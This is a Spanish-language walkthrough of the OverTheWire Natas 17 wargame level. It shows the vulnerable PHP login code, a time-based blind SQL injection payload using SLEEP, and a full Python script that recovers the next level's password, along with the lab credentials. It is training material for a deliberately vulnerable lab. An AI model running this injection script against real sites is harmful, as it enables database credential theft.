# Natas 17

#### URL: http://natas17.natas.labs.overthewire.org
#### Credenciales: natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

Este nivel es inyeccion SQL a ciegas, como uno anterior pero con la particularidad de que no recibimos confirmacion de nuestras consultas:

``` php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Aqui podemos usar una condicional y concatenarla con una llamada a una funcion que retrase la peticion x segundos, asi las peticiones con un retraso >= x segundos serán respuestas afirmativas. Podemos usar:
`IF (BINARY SUBSTRING(password,1,[extension]) = 'valor',SLEEP(segundos),0)`

``` python
from base64 import b64encode
import string
import requests

URL="http://natas17.natas.labs.overthewire.org/index.php?debug=1"
headers = {"Authorization" : f"Basic {b64encode(b'natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC').decode()}"}

book = string.ascii_letters + string.digits
passwd = ""

def testChar(c):
    global found_char
    payload = {'username':f"natas18\" AND IF(BINARY SUBSTRING(password,1,{1+len(passwd)}) = '{passwd + c}',SLEEP(4),0) -- "}
    x = requests.post(URL,data=payload,headers=headers)
    if x.elapsed.total_seconds() >= 4:
        found_char=c
    print(f"Trying: {payload} --- {x.elapsed}")

for i in range(32):
    found_char = None
    for c in book:
        testChar(c)
        if found_char:
            print(f"Found {found_char} at position {i+1}")
            passwd+=found_char
            break
    if not found_char:
        print("No character was found but your script is filled with determination.")
        break

print(f"Final Password: {passwd}")
```

Ejecutamos este script con `python script.py` y obtenemos 

`natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`

PD
+ Aqui no se puede usa multiples hilos porque generaria falsos positivos, por lo que el proceso es un poco largo y tedioso.
+ Usé 4 segundos porque debido a la calidad de mi conexión, algunas peticiones con 2 o 3 segundos eran retrasos y se convertian en falsos positivos.

